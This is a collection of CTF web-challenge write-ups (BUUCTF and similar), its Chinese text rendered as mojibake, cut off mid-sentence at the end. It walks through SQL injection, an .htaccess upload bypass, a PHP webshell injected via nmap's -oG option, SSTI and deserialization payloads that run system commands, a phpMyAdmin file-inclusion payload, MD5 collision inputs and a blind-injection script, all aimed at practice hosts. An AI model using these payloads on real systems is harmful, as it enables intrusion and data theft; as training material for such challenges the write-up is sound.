\\\nè¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: ç©ºæ ¼\n```\n\nåªèƒ½å°è¯•æŠ¥é”™æ³¨å…¥äº†\n\n```\n1'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),15)),0x7e),1))#\n1'or(updatexml(1,concat(0x7e,(right((select(group_concat(password))from(H4rDsq1)),15)),0x7e),1))#\n```\n\næŠ¥é”™æ³¨å…¥é™åˆ¶é•¿åº¦ï¼Œç”¨rightå‡½æ•°åˆ‡å‰²\n\n\n\n\n\n## [CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World\n\nå¸ƒå°”ç›²æ³¨\n\n```python\nimport requests\nurl=\"http://40a6cf54-8382-490a-8651-8324677bb273.node4.buuoj.cn:81/index.php\"\nflagchar=\"flag{-abcdef1234567890}\"\nfor i in range(1,50):\n    for j in flagchar:\n        data={\n            'id':f\"if(ascii(substr((select(flag)from(flag)),{i},1))={ord(j)},2,1)\"\n        }\n        tex=requests.post(url=url,data=data).text\n        if \"Do you want to be my girlfriend\" in tex:\n            print(j,end=\"\")\n            break\n```\n\n## [GXYCTF2019]BabyUpload\n\né¦–å…ˆå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œè¢«è¿‡æ»¤ï¼Œå°è¯•pngå›¾ç‰‡ï¼Œè¿‡æ»¤ï¼Œåªèƒ½ä¸Šä¼ jpegäº†ï¼ŒæˆåŠŸ\n\nå‘ç°æœåŠ¡å™¨æ˜¯apacheæœåŠ¡å™¨ï¼Œå°è¯•ä¸Šä¼ .htaccessæ–‡ä»¶\n\n```\nAddType application/x-httpd-php .jpeg\n```\n\næˆåŠŸ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-14 20.14.17.png)\n\næˆåŠŸ\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-14 20.18.24.png)\n\nèšå‰‘é“¾æ¥å³å¯\n\n## [BUUCTF 2018]Online Tool\n\nä¸Šæ¥ä¸¤ä¸ªå‡½æ•°escapeshellarg()å’Œescapeshellcmd()\n\n```\nescapeshellarg()å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚å¯¹äºç”¨æˆ·è¾“å…¥çš„éƒ¨åˆ†å‚æ•°å°±åº”è¯¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ã€‚shell å‡½æ•°åŒ…å«exec(),system()æ‰§è¡Œè¿ç®—ç¬¦ã€‚\n```\n\n```\nescapeshellcmd()å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ°exec()æˆ–system()å‡½æ•°ï¼Œæˆ–è€…æ‰§è¡Œæ“ä½œç¬¦ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚åæ–œçº¿ï¼ˆ\\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š&#;`|*?~<>^()[]{}$,\\x0Aå’Œ\\xFFã€‚'å’Œ\"ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ%å’Œ!å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚\n```\n\nä¸¤ä¸ªå‡½æ•°ä½¿ç”¨çš„ä¾‹å­\n\n```\nåŸå§‹è¾“å…¥ 172.17.0.2' -v -d a=1\nescapeshellargå¤„ç†å '172.17.0.2''' -v -d a=1'\nescapeshellcmdå¤„ç†å '172.17.0.2'\\'' -v -d a=1'\n```\n\nåœ¨æœ¬é¢˜ä¸­ï¼Œä½¿ç”¨çš„nmapæœ‰ä¸€ä¸ªåä¸º-oGçš„å‚æ•°é€‰é¡¹ï¼Œå¯ä»¥å°†nmapçš„å‘½ä»¤å’Œæ‰§è¡Œç»“æœå†™å…¥æ–‡ä»¶\n\n```\npayload:?host=' <?php @eval($_POST[\"kkk\"]);?> -oG kkk.php '\n```\n\nä¼ å…¥åå˜ä¸º\n\n```\nnmap -T5 -sT -Pn --host-timeout 2 -F ''<?php @eval($_POST[\"kkk\"]);?> -oG kkk.php''\n```\n\n## [BJDCTF2020]The mystery of ip\n\nSSTIæ¨¡ç‰ˆæ³¨å…¥ï¼Œä»¥åå­¦äº†åœ¨ç†è§£å§\n\n```\nX-Forwarded-For: {{system(\"cat /flag\")}}\n```\n\n\n\n## [RoarCTF 2019]Easy Calc\n\nPHPå­—ç¬¦ä¸²è§£ææ¼æ´ï¼ŒæŸ¥çœ‹æ•°æ®åŒ…è®¿é—®calc.php\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-14 22.29.28.png)\n\nå°è¯•ä¼ å…¥scandir()æ‰«ææ–‡ä»¶ï¼Œå‘ç°WAFé˜»æŒ¡ï¼Œå°†ä¼ å…¥å‚æ•°ç”±numæ”¹ä¸º numï¼Œphpè·å–åˆ°çš„å‚æ•°åç§°ä¸ºnumè€ŒWAFè·å–åˆ° numï¼Œç»•è¿‡WAFæˆåŠŸï¼Œæ‰«æå‘ç°åœ¨æ ¹ç›®å½•ä¸‹æœ‰f1aggæ–‡ä»¶ï¼Œä½¿ç”¨file_get_contentå‡½æ•°è¯»å–æ–‡ä»¶å³å¯\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-14 22.35.38.png)\n\n\n\n## [ç½‘é¼æ¯ 2018]Fakebook\n\né¦–å…ˆæ³¨å†Œåè¿›å…¥ï¼Œå‘ç°noç–‘ä¼¼å­˜åœ¨SQLæ³¨å…¥ï¼Œå°è¯•union selectè¢«è¿‡æ»¤ï¼Œå°è¯•union/**/selectæˆåŠŸ\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-15 13.17.59.png)\n\nçˆ†å‡ºå›æ˜¾ä½ç½®ï¼Œä»¥åŠä¼¼ä¹ç½‘é¡µå¯¹æ•°æ®åº“å†…å®¹è¿›è¡Œäº†ååºåˆ—åŒ–ï¼Œç¨åå†çœ‹ï¼Œå…ˆè¿›è¡ŒSQLæ³¨å…¥çˆ†å‡ºå†…å®¹\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-15 13.19.45.png)\n\nå‘ç°ç”¨æˆ·ä¿¡æ¯æ˜¯è¢«åºåˆ—åŒ–åå­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„ï¼Œä¸‹ä¸€æ­¥åº”å½“å°è¯•æŸ¥çœ‹æºç è¿›è¡Œååºåˆ—åŒ–äº†ï¼Œè®¿é—®robots.txtå‘ç°äº†ç½‘ç«™æºç ï¼Œæºç å¯¹ç”¨æˆ·ä¼ å…¥çš„åšå®¢é“¾æ¥è¿›è¡Œè®¿é—®å¹¶æ¸²æŸ“ï¼Œç›´æ¥å°†é“¾æ¥æ”¹ä¸ºæœ¬åœ°æ–‡ä»¶å¹¶æ¸²æŸ“ï¼Œå¾—åˆ°flag\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-15 13.30.53.png)\n\n## [GXYCTF2019]ç¦æ­¢å¥—å¨ƒ\n\né¦–å…ˆçœ‹robots.txtå‘ç°æ²¡æœ‰å†…å®¹ï¼Œæ‰«ç›®å½•æ‰«å‡º.gitï¼ŒçŒœæµ‹æœ‰æºç æ³„éœ²ï¼Œä½¿ç”¨gitHackå¾—åˆ°index.php\n\n```php\n//index.php\n<?php\ninclude \"flag.php\";\necho \"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ<br>\";\nif(isset($_GET['exp'])){\n    if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) {\n        if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) {\n            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {\n                // echo $_GET['exp'];\n                @eval($_GET['exp']);\n            }\n            else{\n                die(\"è¿˜å·®ä¸€ç‚¹å“¦ï¼\");\n            }\n        }\n        else{\n            die(\"å†å¥½å¥½æƒ³æƒ³ï¼\");\n        }\n    }\n    else{\n        die(\"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼\");\n    }\n}\n// highlight_file(__FILE__);\n?>\n\n```\n\nç¬¬ä¸€æ­¥è¿‡æ»¤äº†æ‰€æœ‰ä¼ªåè®®ï¼Œåªèƒ½æ‰§è¡Œå‡½æ•°äº†ï¼Œä¸‹ä¸€æ­¥æŸ¥çœ‹æ­£åˆ™ï¼Œå¤§ä½¬çš„è§£é‡Šå¦‚ä¸‹\n\n```\n(?R)æ˜¯å¼•ç”¨å½“å‰è¡¨è¾¾å¼ï¼Œ(?R)? è¿™é‡Œå¤šä¸€ä¸ª?è¡¨ç¤ºå¯ä»¥æœ‰å¼•ç”¨ï¼Œä¹Ÿå¯ä»¥æ²¡æœ‰ã€‚ï¼Œå¼•ç”¨ä¸€æ¬¡æ­£åˆ™åˆ™å˜æˆäº†[a-z,_]+\\([a-z,_]+\\((?R)?\\)\\),å¯ä»¥è¿­ä»£ä¸‹å»ï¼Œé‚£ä¹ˆå®ƒæ‰€åŒ¹é…çš„å°±æ˜¯print(echo(1))ã€a(b(c()));ç±»ä¼¼è¿™ç§å¯ä»¥æ‹¬å·å’Œå­—ç¬¦ç»„æˆçš„ï¼Œè¿™å…¶å®æ˜¯æ— å‚æ•°RCEæ¯”è¾ƒå…¸å‹çš„ä¾‹å­\n```\n\næœ€ç»ˆæˆ‘ä»¬å°±æ˜¯è¦æ„é€ ä¸€ä¸ªæ— å‚åµŒå¥—å‡½æ•°æ‰§è¡Œï¼Œé¦–å…ˆå°è¯•æ‰«ææ–‡ä»¶ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰flagæ–‡ä»¶å­˜åœ¨\n\nçŸ¥è¯†ç‚¹ï¼šlocaleconvå‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-20 22.15.48.png)\n\né€šè¿‡è¿™ä¸ªå‡½æ•°ç¬¬ä¸€é¡¹æˆ‘ä»¬å¯ä»¥æ‹¿åˆ°.ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨scandirå‡½æ•°æ‰«æç›®å½•æ–‡ä»¶\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-20 22.17.17.png)\n\né€šè¿‡currentå–å‡ºç¬¬ä¸€ä½.ï¼Œflag.phpåœ¨å€’æ•°ç¬¬äºŒçš„ä½ç½®ï¼Œå…ˆä½¿ç”¨array_reverseå‡½æ•°å€’è½¬æ’åºï¼Œåœ¨ä½¿ç”¨nextå–ç¬¬äºŒä½ï¼Œä½¿ç”¨hightlight_fileè¯»å‡ºæ–‡ä»¶\n\n```\npayload:?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-20 22.19.48.png)\n\n## [GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“\n\nè¿›å»å°±å‘Šè¯‰ä½ æ•°æ®åº“æ˜¯ç©ºçš„ï¼Œå…ˆæ‰«ä¸ªæ–‡ä»¶å§ï¼Œå‘ç°æœ‰robots.txtå’Œ/phpmyadmin/ï¼Œå…ˆçœ‹robotsï¼Œæç¤ºå»phpinfo.phpï¼Œå°±æ˜¯ä¸ªphpinfoé¡µé¢ï¼Œä¹Ÿæ²¡å•¥æç¤ºï¼Œçœ‹phpmyadminï¼Œæ•°æ®åº“é‡Œè¿˜çœŸæ²¡ä¸œè¥¿\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-22 15.25.46.png)\n\nçœ‹WPï¼Œå‘ç°æ˜¯ä¸€ä¸ªå…³äºphpmyadminçš„è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´[CVE-2018-12613](https://blog.csdn.net/qq_43579362/article/details/108476182)\n\nå‡ºç°bugçš„ä»£ç ä½ç½®ï¼šphpMyAdmin/index.php\n\n![](https://img-blog.csdnimg.cn/20200908202849454.png)\n\nå¯ä»¥çœ‹åˆ°ä¼ å…¥çš„targetéœ€è¦æ»¡è¶³çš„æ¡ä»¶ï¼š\n\n1ã€æ˜¯å­—ç¬¦ä¸²\n\n2ã€æ²¡æœ‰index\n\n3ã€ä¸`target_blacklist`ä¸­\n\n4ã€æ»¡è¶³`Core`ç±»ä¸­`checkPageValidity`å‡½æ•°æ£€æŸ¥\n\næœ€åä¸€ä¸ªæ¡ä»¶çš„æœ‰å…³ä»£ç å¦‚ä¸‹\n\n![](https://img-blog.csdnimg.cn/20200908203030418.png)\n\nä¸Šè¿°å‡½æ•°å¯çŸ¥ï¼Œå¦‚æœæƒ³è¦å‡½æ•°è¿”å›çœŸï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹ä¸‰ä¸ªæ¡ä»¶çš„ä»»æ„ä¸€ä¸ª\n\n1ã€`$page`å˜é‡å€¼åœ¨`$white_list`æ•°ç»„ä¸­\n\n2ã€ç»è¿‡`mb_substr()`å’Œ`mb_strpos()`å¤„ç†çš„`$pageâ€“>$_page`çš„å˜é‡å€¼åœ¨`$_whitelist`æ•°ç»„ä¸­ï¼Œ\n\n3ã€ç»è¿‡`urldecode(),mb_substr(),mb_strpos()`å¤„ç†çš„`$pageâ€“>$_page`çš„å˜é‡å€¼åœ¨`$_whitelist`æ•°ç»„ä¸­ï¼Œ\n\n![](https://img-blog.csdnimg.cn/20200908204934607.png)\n\nå¼€å§‹æ„é€ payloadï¼Œå…ˆæŒ‘ä¸€ä¸ªåœ¨whitelistä¸­çš„æ–‡ä»¶db_datadict.phpç„¶ååŠ é—®å·å’Œæˆ‘ä»¬æƒ³è¦åŒ…å«çš„æ–‡ä»¶\n\n```\npayload:?target=db_datadict.php%253f/../../../../../../../../../flag\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-22 15.45.08.png)\n\n## [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb\n\næ‰“å¼€ç½‘ç«™æŸ¥çœ‹æºç ï¼Œå‘ç°æœ‰ä¸€ä¸ªå»¶æ—¶5ç§’æäº¤çš„å‚æ•°ï¼ŒæŠ“åŒ…æŸ¥çœ‹å‚æ•°åç§°å‘ç°å¯èƒ½æ˜¯æ‰§è¡Œå‡½æ•°çš„ä¸œè¥¿ï¼Œå°è¯•highlight_fileè¯»å–é¡µé¢æºç æˆåŠŸ\n\n```php+HTML\n<?php\n    $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\",  \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\");\n    function gettime($func, $p) {\n        $result = call_user_func($func, $p);\n        $a= gettype($result);\n        if ($a == \"string\") {\n            return $result;\n        } else {return \"\";}\n    }\n    class Test {\n        var $p = \"Y-m-d h:i:s a\";\n        var $func = \"date\";\n        function __destruct() {\n            if ($this->func != \"\") {\n                echo gettime($this->func, $this->p);\n            }\n        }\n    }\n    $func = $_REQUEST[\"func\"];\n    $p = $_REQUEST[\"p\"];\n\n    if ($func != null) {\n        $func = strtolower($func);\n        if (!in_array($func,$disable_fun)) {\n            echo gettime($func, $p);\n        }else {\n            die(\"Hacker...\");\n        }\n    }\n    ?>\n```\n\nè¿‡æ»¤äº†å¤§éƒ¨åˆ†å±é™©å‡½æ•°ï¼Œç»§ç»­çœ‹å‘ç°æœ‰ä¸€ä¸ªTestç±»åœ¨é”€æ¯æ—¶ä¼šæ‰§è¡Œå‡½æ•°ï¼Œå¯é€šè¿‡ååºåˆ—åŒ–ç»•è¿‡å‡½æ•°ç¦ç”¨\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-23 00.33.29.png)\n\nå°è¯•æ„é€ æˆåŠŸï¼Œä½†æ²¡æœ‰å‘ç°flagï¼Œæœç´¢ä¸€ä¸‹å‘ç°åœ¨/tmp/flagoefiu4r93\n\n```\npayload:\nPOST\nfunc=unserialize&p=O:4:\"Test\":2:{s:1:\"p\";s:22:\"tac /tmp/flagoefiu4r93\";s:4:\"func\";s:6:\"system\";}\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-23 00.36.23.png)\n\n## [BSidesCF 2020]Had a bad day\n\né€‰çŒ«çŒ«æˆ–ç‹—ç‹—åurlä¸­å‡ºç°æ³¨å…¥ç‚¹ï¼Œå°è¯•è¯»å–æ–‡ä»¶\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-25 23.42.45.png)\n\nä¼¼ä¹ä¼šè‡ªåŠ¨è¡¥åç¼€ï¼Œå»æ‰.phpï¼Œè¯»å–æºç \n\n```php+HTML\n<?php\n\t$file = $_GET['category'];\n\tif(isset($file))\n\t{\n\t\tif( strpos( $file, \"woofers\" ) !==  false || strpos( $file, \"meowers\" ) !==  false || strpos( $file, \"index\"))\n    {\n\t\t\tinclude ($file . '.php');\n\t\t}\n\t\telse{\n\t\t\techo \"Sorry, we currently only support woofers and meowers.\";\n\t\t}\n\t}\n?>\n```\n\nåŒ…å«çš„æ¡ä»¶æ˜¯å‚æ•°ä¸­æœ‰woofersï¼Œmeowersæˆ–è€…indexï¼Œä»»é€‰ä¸€ä¸ªæ„é€ payloadï¼Œå†ä½¿ç”¨è¿‡æ»¤å™¨base64ç¼–ç å°±å¯ä»¥\n\n```\npayload:?category=php://filter/convert.base64-encode/resource=index/../flag\n```\n\n## [BJDCTF2020]Mark loves cat\n\nå•¥ä¹Ÿæ²¡æœ‰å…ˆæ‰«å§ï¼Œæ‰«å‡º.gitï¼Œgithackè·‘ä¸€ä¸‹ï¼Œçœ‹æºç \n\n```PHP\n//index.php\n<?php\n\n$flag = file_get_contents('/flag');\n\n$yds = \"dog\";\n$is = \"cat\";\n$handsome = 'yds';\n\nforeach($_POST as $x => $y){\n    $$x = $y;\n}\n\nforeach($_GET as $x => $y){\n    $$x = $$y;\n}\n\nforeach($_GET as $x => $y){\n    if($_GET['flag'] === $x && $x !== 'flag'){\n        exit($handsome);\n    }\n}\n\nif(!isset($_GET['flag']) && !isset($_POST['flag'])){\n    exit($yds);\n}\n\nif($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){\n    exit($is);\n}\n\necho \"the flag is: \".$flag;\n```\n\nç”¨ç¬¬äºŒä¸ªåˆ¤æ–­ï¼Œ$yds=$flagå³å¯\n\n```\npayload:?yds=flag\n```\n\n## [å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢\n\nä¸‹è½½æºç ï¼Œ3000ä¸ªæ–‡ä»¶ï¼Œæ‰“å¼€çœ‹å†…å®¹ä¸­æœ‰è®¸å¤ševalå‡½æ•°ï¼Œä½†æ˜¯æ‰§è¡Œæ—¶å†…å®¹ä¸ä¸€å®šå¯ç”¨ï¼Œç¼–å†™è„šæœ¬è¿›è¡Œæµ‹è¯•\n\n```python\nimport os\nimport requests\nimport re\npath=\"C:\\phpstudy_pro\\WWW\\src\\\\\"\nfiles=os.listdir(path)\nprint(path)\nfor i in files:\n    try:\n        with open(path+i,'r') as f:\n            gets = list(re.findall('\\$_GET\\[\\'(.*?)\\'\\]', f.read()))\n            posts = list(re.findall('\\$_POST\\[\\'(.*?)\\'\\]', f.read()))\n    except:\n        continue\n    data={}\n    parm={}\n    for j in gets:\n        parm[j]=\"echo 'jlanhere';\"\n    for j in posts:\n        data[j] = \"echo 'jlanhere';\"\n    tex=requests.post(url=f\"http://src/{i}\",data=data,params=parm).text\n    if \"jlanhere\" in tex:\n        tp={}\n        for k in gets:\n            tp = {}\n            tp[k] = \"echo 'jlanhere';\"\n            textt = requests.get(url=f\"http://src/{i}\",params=tp).text\n            if \"jlanhere\" in textt:\n                print(\"get\")\n                print(i)\n                print(k)\n                exit()\n        for k in posts:\n            tp = {}\n            tp[k] = \"echo 'jlanhere';\"\n            textt = requests.post(url=f\"http://src/{i}\",data=tp).text\n            if \"jlanhere\" in textt:\n                print(\"post\")\n                print(i)\n                print(k)\n                exit()\n```\n\næ‰¾å‡ºä¸€ä¸ªæ³¨å…¥ç‚¹\n\n```\npayload:\nxk0SzyKwfzw.php?Efa5BVG=cat /flag\n```\n\næ‹¿åˆ°flag\n\n## [å®‰æ´µæ¯ 2019]easy_web\n\nçœ‹çœ‹ä¼ å‚ï¼Œimgçš„å†…å®¹æ˜¯è¢«hexç¼–ç åå†ç”¨ä¸¤æ¬¡base64ç¼–ç å¾—åˆ°çš„ï¼Œè§£ç å†…å®¹å¦‚ä¸‹\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-26 23.02.28.png)\n\nå°è¯•å°†index.phpç¼–ç ä¼ å…¥ï¼Œå¾—åˆ°æºç \n\n```php+html\n<?php\nerror_reporting(E_ALL || ~ E_NOTICE);\nheader('content-type:text/html;charset=utf-8');\n$cmd = $_GET['cmd'];\nif (!isset($_GET['img']) || !isset($_GET['cmd'])) \n    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');\n$file = hex2bin(base64_decode(base64_decode($_GET['img'])));\n\n$file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file);\nif (preg_match(\"/flag/i\", $file)) {\n    echo '<img src =\"./ctf3.jpeg\">';\n    die(\"xixiï½ no flag\");\n} else {\n    $txt = base64_encode(file_get_contents($file));\n    echo \"<img src='data:image/gif;base64,\" . $txt . \"'></img>\";\n    echo \"<br>\";\n}\necho $cmd;\necho \"<br>\";\nif (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i\", $cmd)) {\n    echo(\"forbid ~\");\n    echo \"<br>\";\n} else {\n    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {\n        echo `$cmd`;\n    } else {\n        echo (\"md5 is funny ~\");\n    }\n}\n\n?>\n```\n\nç›´æ¥çœ‹å…³é”®ï¼Œmd5å¼ºç›¸ç­‰ç»•è¿‡\n\n```\na=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\næˆ–\na=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\n```\n\nç„¶åå°±æ˜¯å‘½ä»¤ç»•è¿‡ï¼Œä½¿ç”¨åæ–œæ ç»•è¿‡cat\n\n```\npayload:?cmd=ca\\t /flag\nPOST:\na=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\n```\n\n## [BJDCTF2020]Cookie is so stable\n\nç›´æ¥æµ‹è¯•å‡ºSSTIï¼Œä½†æ˜¯è¿™ä¸ªæ¸²æŸ“æ¡†æ¶ä¸æ˜¯flaskçš„ï¼Œç°æºœæºœå»çœ‹wpï¼Œå‘ç°æ˜¯phpçš„twigæ¸²æŸ“æ¨¡ç‰ˆï¼Œç›´æ¥åœ¨cookieå¤„æ”¾payloadå³å¯\n\n```\npayload:\nCookie: user={{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"cat /flag\")}}\n```\n\n## [WUSTCTF2020]æœ´å®æ— å\n\nrobots.txt->fAke_f1agggg.php->fl4g.php\n\n```PHP\n<?php \nheader('Content-type:text/html;charset=utf-8'); \nerror_reporting(0); \nhighlight_file(__file__); \n\n\n//level 1 \nif (isset($_GET['num'])){ \n    $num = $_GET['num']; \n    if(intval($num) < 2020 && intval($num + 1) > 2021){ \n        echo \"æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.</br>\"; \n    }else{ \n        die(\"é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜\"); \n    } \n}else{ \n    die(\"å»éæ´²å§\"); \n} \n//level 2 \nif (isset($_GET['md5'])){ \n   $md5=$_GET['md5']; \n   if ($md5==md5($md5)) \n       echo \"æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.</br>\"; \n   else \n       die(\"æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²\"); \n}else{ \n    die(\"å»éæ´²å§\"); \n} \n\n//get flag \nif (isset($_GET['get_flag'])){ \n    $get_flag = $_GET['get_flag']; \n    if(!strstr($get_flag,\" \")){ \n        $get_flag = str_ireplace(\"cat\", \"wctf2020\", $get_flag); \n        echo \"æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.</br>\"; \n        system($get_flag); \n    }else{ \n        die(\"å¿«åˆ°éæ´²äº†\"); \n    } \n}else{ \n    die(\"å»éæ´²å§\"); \n} \n?> \n```\n\né¦–å…ˆintvalå‡½æ•°ç‰¹æ€§\n\n```\nintval('2e4')=2\nintval('2e4'+1)=20001\nå› ä¸ºåœ¨æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤æ—¶ç›¸å½“äºå…ˆæ‰§è¡Œäº†int('2e4')=20000å†åŠ ä¸€\næ‰€ä»¥ç¬¬ä¸€ä¸ªç»•è¿‡num=2e4å³å¯\n```\n\nç¬¬äºŒä¸ªmd5å¼±ç›¸ç­‰ç»•è¿‡\n\n```\n$md5=md5($md5)\nå¼€å¤´æ˜¯0eå¹¶ä¸”md5åä¹Ÿæ˜¯0eå³å¯\n0e215962017\n```\n\næœ€åç©ºæ 